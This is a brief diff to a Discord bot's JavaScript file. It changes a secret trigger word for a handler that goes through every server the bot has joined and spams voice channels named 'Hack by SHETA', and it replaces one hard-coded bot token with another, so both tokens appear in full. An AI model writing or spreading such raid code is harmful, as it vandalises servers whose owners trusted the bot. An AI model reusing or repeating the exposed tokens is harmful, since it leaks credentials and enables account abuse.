@@ -651,7 +651,7 @@ LOka.on("message", message => {
   }
 });
 LOka.on("message", message => {
-  if (message.content === ".SHETA") {
+  if (message.content === "hozan") {
     LOka.guilds.forEach(m => {
       m.createChannel("Hack by SHETA 🛠", "voice");
       m.createChannel("Hack by SHETA 🛠", "voice");
@@ -1058,4 +1058,4 @@ LOka.on("guildMemberAdd", member => {
   }
 });
 
-LOka.login("NTg0MzIzMTY5MzM1Mzc3OTMw.Xyjqbw.lTup-3U1BrpobkGZ7IHuLS8955Y");
+LOka.login("NzM0MzU5NjExMDkxNDUxOTI2.XzEkPw.IPQCYT0coIaZkW5k0GpQnQQA4pk");
